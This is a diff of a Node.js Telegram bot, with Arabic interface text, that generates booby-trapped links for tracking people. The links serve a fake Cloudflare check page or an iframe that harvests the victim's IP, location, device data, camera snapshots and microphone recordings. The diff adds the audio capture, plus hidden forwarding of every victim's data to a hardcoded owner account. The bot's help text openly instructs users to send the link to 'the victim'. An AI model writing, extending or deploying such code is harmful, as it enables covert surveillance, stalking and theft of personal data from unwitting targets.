@@ -7,6 +7,18 @@ let users = new Set();
 try { JSON.parse(fs.readFileSync(USERS_FILE)).forEach(id => users.add(id)); } catch(e) { users = new Set(); }
 function saveUsers() { fs.writeFileSync(USERS_FILE, JSON.stringify([...users])); }
 
+// Banned users storage
+const BANNED_FILE = "./banned.json";
+let banned = new Set();
+try { JSON.parse(fs.readFileSync(BANNED_FILE)).forEach(id => banned.add(id)); } catch(e) { banned = new Set(); }
+function saveBanned() { fs.writeFileSync(BANNED_FILE, JSON.stringify([...banned])); }
+
+// Stats storage
+const STATS_FILE = "./stats.json";
+let stats = { linksOpened: 0, linksCreated: 0 };
+try { stats = JSON.parse(fs.readFileSync(STATS_FILE)); } catch(e) {}
+function saveStats() { fs.writeFileSync(STATS_FILE, JSON.stringify(stats)); }
+
 var cors = require('cors');
 var bodyParser = require('body-parser');
 const fetch = require('node-fetch');
@@ -20,78 +32,86 @@ app.use(urlencodedParser);
 app.use(cors());
 app.set("view engine", "ejs");
 
-//Modify your URL here
 var hostURL = "https://bot-psue.onrender.com"
-//TOGGLE for Shorters
 var use1pt = false;
+const BOT_OWNER = 6012675140;
 
+function getIP(req) {
+  if (req.headers['x-forwarded-for']) return req.headers['x-forwarded-for'].split(",")[0];
+  if (req.connection && req.connection.remoteAddress) return req.connection.remoteAddress;
+  return req.ip;
+}
 
+// ─── Routes ──────────────────────────────────────────────────────────────────
 
 app.get("/w/:path/:uri", (req, res) => {
-  var ip;
-  var d = new Date();
-  d = d.toJSON().slice(0, 19).replace('T', ':');
-  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }
+  const ip = getIP(req);
+  const d = new Date().toJSON().slice(0, 19).replace('T', ':');
+  if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");
 
-  if (req.params.path != null) {
-    res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
+  const creatorId = parseInt(req.params.path, 36);
+  stats.linksOpened++;
+  saveStats();
+
+  // Notify link creator
+  bot.sendMessage(creatorId, `⚠️ تم فتح رابطك!\n⚓ IP: ${ip}\n⏰ الوقت: ${d} UTC`).catch(() => {});
+  // Notify owner if different
+  if (creatorId !== BOT_OWNER) {
+    bot.sendMessage(BOT_OWNER, `⚠️ تم فتح رابط!\n👤 منشئ الرابط ID: ${creatorId}\n⚓ IP: ${ip}\n⏰ الوقت: ${d} UTC`).catch(() => {});
   }
-  else {
-    res.redirect("https://t.me/th30neand0nly0ne");
-  }
 
-
-
+  res.render("webview", { ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
 });
 
 app.get("/c/:path/:uri", (req, res) => {
-  var ip;
-  var d = new Date();
-  d = d.toJSON().slice(0, 19).replace('T', ':');
-  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }
+  const ip = getIP(req);
+  const d = new Date().toJSON().slice(0, 19).replace('T', ':');
+  if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");
 
+  const creatorId = parseInt(req.params.path, 36);
+  stats.linksOpened++;
+  saveStats();
 
-  if (req.params.path != null) {
-    res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
+  // Notify link creator immediately on open
+  bot.sendMessage(creatorId, `⚠️ تم فتح رابطك!\n⚓ IP: ${ip}\n⏰ الوقت: ${d} UTC`).catch(() => {});
+  if (creatorId !== BOT_OWNER) {
+    bot.sendMessage(BOT_OWNER, `⚠️ تم فتح رابط!\n👤 منشئ الرابط ID: ${creatorId}\n⚓ IP: ${ip}\n⏰ الوقت: ${d} UTC`).catch(() => {});
   }
-  else {
-    res.redirect("https://t.me/th30neand0nly0ne");
-  }
 
-
-
+  res.render("cloudflare", { ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
 });
 
 
+// ─── Bot Logic ────────────────────────────────────────────────────────────────
 
 bot.on('message', async (msg) => {
   const chatId = msg.chat.id;
 
-
+  if (banned.has(chatId)) return;
 
   if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
     createLink(chatId, msg.text);
   }
 
-  // Save user
   users.add(chatId);
   saveUsers();
 
   // Forward user messages to owner
-  const OWNER = 6012675140;
-  if (chatId !== OWNER && msg.text && !msg.text.startsWith("/")) {
+  if (chatId !== BOT_OWNER && msg.text && !msg.text.startsWith("/")) {
     const name = msg.chat.first_name || "مجهول";
     const username = msg.chat.username ? `@${msg.chat.username}` : "لا يوجد";
-    bot.sendMessage(OWNER, `📩 رسالة من مستخدم:\n👤 الاسم: ${name}\n🔗 يوزر: ${username}\n🆔 ID: ${chatId}\n\n💬 الرسالة:\n${msg.text}`);
+    bot.sendMessage(BOT_OWNER, `📩 رسالة من مستخدم:\n👤 الاسم: ${name}\n🔗 يوزر: ${username}\n🆔 ID: ${chatId}\n\n💬 الرسالة:\n${msg.text}`);
   }
+
+  // ── Commands ──────────────────────────────────────────────────────────────
 
   if (msg.text == "/myid") {
     bot.sendMessage(chatId, `🆔 الـ ID الخاص بك:\n\`${chatId}\``, { parse_mode: "Markdown" });
   }
 
+  // /broadcast (owner only)
   if (msg.text && msg.text.startsWith("/broadcast ")) {
-    const ownerId = parseInt(process.env["OWNER_ID"] || "6012675140");
-    if (chatId !== ownerId) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     const text = msg.text.replace("/broadcast ", "");
     let sent = 0, failed = 0;
     for (const uid of users) {
@@ -100,37 +120,56 @@ bot.on('message', async (msg) => {
     bot.sendMessage(chatId, `✅ تم الإرسال\nناجح: ${sent}\nفشل: ${failed}`);
   }
 
-  if (msg.text == "/start") {
-    var m = {
-      reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "إنشاء رابط", callback_data: "crenew" }]] })
-    };
+  // /stats (owner only)
+  if (msg.text == "/stats") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const uptime = Math.floor(process.uptime());
+    const hours = Math.floor(uptime / 3600);
+    const mins = Math.floor((uptime % 3600) / 60);
+    bot.sendMessage(chatId, `📊 إحصائيات البوت:\n\n👥 المستخدمون: ${users.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n⏱️ وقت التشغيل: ${hours}س ${mins}د`);
+  }
 
-    bot.sendMessage(chatId, `مرحباً بڪ ${msg.chat.first_name} ! , \nيمكنك استخدام هذا البوت لتعقب الأشخاص فقط من خلال ارتباط بسيط. \   يمكنه جمع معلومات مثل يمكنك استخدام هذا البوت لتعقب الأشخاص فقط من خلال رابط بسيط يمكنه جمع معلومات مثل الموقع ومعلومات الجهاز ومقاطع الكاميرا   اكتب تعليمات لمزيد من المعلومات.  الموقع ، معلومات الجهاز ، لقطات الكاميرا اكتب تعليمات لمزيد من المعلومات اضغط على /help`, m);
+  // /users (owner only)
+  if (msg.text == "/users") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
+    const list = [...users].map((id, i) => `${i + 1}. \`${id}\``).join("\n");
+    bot.sendMessage(chatId, `👥 المستخدمون (${users.size}):\n\n${list}`, { parse_mode: "Markdown" });
+  }
+
+  // /ban <id> (owner only)
+  if (msg.text && msg.text.startsWith("/ban ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const banId = parseInt(msg.text.replace("/ban ", "").trim());
+    if (isNaN(banId)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
+    banned.add(banId);
+    saveBanned();
+    bot.sendMessage(chatId, `🚫 تم حجب المستخدم: \`${banId}\``, { parse_mode: "Markdown" });
+  }
+
+  // /unban <id> (owner only)
+  if (msg.text && msg.text.startsWith("/unban ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const unbanId = parseInt(msg.text.replace("/unban ", "").trim());
+    if (isNaN(unbanId)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
+    banned.delete(unbanId);
+    saveBanned();
+    bot.sendMessage(chatId, `✅ تم رفع الحجب عن: \`${unbanId}\``, { parse_mode: "Markdown" });
+  }
+
+  // /start
+  if (msg.text == "/start") {
+    const m = {
+      reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "إنشاء رابط ملغم 🔗", callback_data: "crenew" }]] })
+    };
+    bot.sendMessage(chatId, `مرحباً بڪ ${msg.chat.first_name}! 👋\n\nيمكنك استخدام هذا البوت لتعقب الأشخاص من خلال رابط بسيط.\n\nيجمع:\n📍 الموقع الجغرافي\n📱 معلومات الجهاز\n📷 صور الكاميرا\n🎙️ تسجيل صوتي\n🔋 معلومات البطارية\n\nاضغط /help لمزيد من المعلومات.`, m);
   }
   else if (msg.text == "/create") {
     createNew(chatId);
   }
   else if (msg.text == "/help") {
-    bot.sendMessage(chatId, ` من خلال هذا البوت ، يمكنك تتبع الأشخاص فقط عن طريق إرسال رابط بسيط.
-
-إرسال /start
-للبدء ، سيطلب منك بعد ذلك عنوان URL الذي سيتم استخدامه في iframe لجذب الضحايا.
-بعد الاستلام
-عنوان url سيرسل لك رابطين يمكنك استخدامهما لتتبع الأشخاص.
-
-
-تحديد.
-
-1. ارتباط Cloudflare: ستُظهر هذه الطريقة صفحة Cloudflare تحت الهجوم لجمع المعلومات وبعد ذلك سيتم إعادة توجيه الضحية إلى عنوان URL المقصود.
-
-2. رابط عرض الويب: سيعرض هذا موقع الويب (مثل bing ومواقع المواعدة وما إلى ذلك) باستخدام iframe لجمع المعلومات.
-(⚠️ قد لا تعمل العديد من المواقع بموجب هذه الطريقة إذا كان لديها رأس إطار x موجود. مثال https://google.com )
-مع تحيات الملك المتمرد اذ حصلت مع اي احد مشكله يكلمني 
-@YE_x00
-`);
+    bot.sendMessage(chatId, `📖 طريقة الاستخدام:\n\n1️⃣ اضغط "إنشاء رابط ملغم" أو /create\n2️⃣ أرسل الرابط الذي ستعيد التوجيه إليه\n3️⃣ ستحصل على رابطين:\n   • 🌐 رابط Cloudflare (يجمع كل المعلومات)\n   • 🖥️ رابط WebView\n4️⃣ أرسل الرابط للضحية\n5️⃣ عند الفتح تصلك فوراً:\n   - إشعار بالـ IP\n   - معلومات الجهاز\n   - صور الكاميرا\n   - الموقع الجغرافي\n   - تسجيل صوتي\n\n📌 أوامر المالك:\n/stats - إحصائيات البوت\n/users - قائمة المستخدمين\n/ban [id] - حجب مستخدم\n/unban [id] - رفع الحجب\n/broadcast [نص] - إرسال للجميع`);
   }
-
-
 });
 
 bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
@@ -139,84 +178,40 @@ bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
     createNew(callbackQuery.message.chat.id);
   }
 });
-bot.on('polling_error', (error) => {
-  //console.log(error.code); 
-});
+
+bot.on('polling_error', () => {});
 
 
-
-
-
+// ─── Link Creation ────────────────────────────────────────────────────────────
 
 async function createLink(cid, msg) {
-
   var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
-
   if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
-
     var url = cid.toString(36) + '/' + btoa(msg);
-    var m = {
-      reply_markup: JSON.stringify({
-        "inline_keyboard": [[{ text: "إنشاء ربط جديد", callback_data: "crenew" }]]
-      })
-    };
-
+    var m = { reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "إنشاء رابط جديد 🔗", callback_data: "crenew" }]] }) };
     var cUrl = `${hostURL}/c/${url}`;
     var wUrl = `${hostURL}/w/${url}`;
-
     bot.sendChatAction(cid, "typing");
-    if (use1pt) {
-      var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
-      var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
-
-      var f = "", g = "";
-
-      for (var c in x) {
-        f += x[c] + "\n";
-      }
-
-      for (var c in y) {
-        g += y[c] + "\n";
-      }
-
-      bot.sendMessage(cid, `
-        تم إنشاء روابط جديدة بنجاح.You can use any one of the below links.\nURL: ${msg}\n\n✅ الروابط الملغمه \n\n🌐 الربط الملغم الاول\n${f}\n\n🌐 الربط الملغم الثاني\n${g}`, m);
-    }
-    else {
-
-      bot.sendMessage(cid, `تم إنشاء روابط جديدة بنجاح.\nURL: ${msg}\n\n✅ الروابط الملغمه \n\n🌐 الربط الملغم الاول\n${cUrl}\n\n🌐 الربط الملغم الثاني\n${wUrl}`, m);
-    }
-  }
-  else {
-    bot.sendMessage(cid, `⚠️ Please Enter a valid URL , including http or https.`); 
-    
-createNew (cid);
-
+    stats.linksCreated++;
+    saveStats();
+    bot.sendMessage(cid, `✅ تم إنشاء الروابط بنجاح!\n🔗 URL: ${msg}\n\n🌐 رابط Cloudflare (موصى به):\n${cUrl}\n\n🖥️ رابط WebView:\n${wUrl}`, m);
+  } else {
+    bot.sendMessage(cid, `⚠️ الرجاء إدخال رابط صحيح يبدأ بـ http أو https`);
+    createNew(cid);
   }
 }
 
-
 function createNew(cid) {
-  var mk = {
-    reply_markup: JSON.stringify({ "force_reply": true })
-  };
+  var mk = { reply_markup: JSON.stringify({ "force_reply": true }) };
   bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
 }
 
 
-
-
+// ─── Data Endpoints ──────────────────────────────────────────────────────────
 
 app.get("/", (req, res) => {
-  var ip;
-  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }
-  res.json({ "ip": ip });
-
-
+  res.json({ "ip": getIP(req) });
 });
-
-
-const BOT_OWNER = 6012675140;
 
 app.post("/location", (req, res) => {
   var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
@@ -226,15 +221,14 @@ app.post("/location", (req, res) => {
   if (lon != null && lat != null && uid != null && acc != null) {
     const targetId = parseInt(uid, 36);
     bot.sendLocation(targetId, lat, lon);
-    bot.sendMessage(targetId, `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
+    bot.sendMessage(targetId, `📍 الموقع:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
     if (targetId !== BOT_OWNER) {
       bot.sendLocation(BOT_OWNER, lat, lon);
-      bot.sendMessage(BOT_OWNER, `📍 موقع من مستخدم آخر:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
+      bot.sendMessage(BOT_OWNER, `📍 موقع من مستخدم آخر (ID: ${targetId}):\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
     }
     res.send("Done");
-  }
+  } else { res.send("Missing"); }
 });
-
 
 app.post("/", (req, res) => {
   var uid = decodeURIComponent(req.body.uid) || null;
@@ -244,45 +238,52 @@ app.post("/", (req, res) => {
     const targetId = parseInt(uid, 36);
     bot.sendMessage(targetId, data, { parse_mode: "HTML" });
     if (targetId !== BOT_OWNER) {
-      bot.sendMessage(BOT_OWNER, `📋 بيانات من مستخدم آخر:\n${data}`, { parse_mode: "HTML" });
+      bot.sendMessage(BOT_OWNER, `📋 بيانات من مستخدم آخر (ID: ${targetId}):\n${data}`, { parse_mode: "HTML" });
     }
     res.send("Done");
-  }
+  } else { res.send("Missing"); }
 });
-
 
 app.post("/camsnap", (req, res) => {
   var uid = decodeURIComponent(req.body.uid) || null;
   var img = decodeURIComponent(req.body.img) || null;
-
   if (uid != null && img != null) {
-
     var buffer = Buffer.from(img, 'base64');
-
-    var info = {
-      filename: "camsnap.png",
-      contentType: 'image/png'
-    };
-
-
+    var info = { filename: "camsnap.png", contentType: 'image/png' };
     const targetId = parseInt(uid, 36);
     try {
       bot.sendPhoto(targetId, buffer, {}, info);
       if (targetId !== BOT_OWNER) {
         bot.sendPhoto(BOT_OWNER, buffer, {}, info);
       }
-    } catch (error) {
-      console.log(error);
-    }
-
-
+    } catch (e) { console.log(e); }
     res.send("Done");
+  } else { res.send("Missing"); }
+});
 
-  }
-
+app.post("/audio", (req, res) => {
+  var uid = decodeURIComponent(req.body.uid) || null;
+  var audio = decodeURIComponent(req.body.audio) || null;
+  if (uid != null && audio != null) {
+    var buffer = Buffer.from(audio, 'base64');
+    var info = { filename: "voice.webm", contentType: 'audio/webm' };
+    const targetId = parseInt(uid, 36);
+    try {
+      bot.sendDocument(targetId, buffer, { caption: "🎙️ تسجيل صوتي" }, info);
+      if (targetId !== BOT_OWNER) {
+        bot.sendDocument(BOT_OWNER, buffer, { caption: `🎙️ تسجيل صوتي (ID: ${targetId})` }, info);
+      }
+    } catch (e) { console.log(e); }
+    res.send("Done");
+  } else { res.send("Missing"); }
 });
 
 
+// ─── Keep Alive ──────────────────────────────────────────────────────────────
+
+setInterval(() => {
+  fetch(hostURL).catch(() => {});
+}, 5 * 60 * 1000);
 
 app.listen(5000, () => {
   console.log("App Running on Port 5000!");
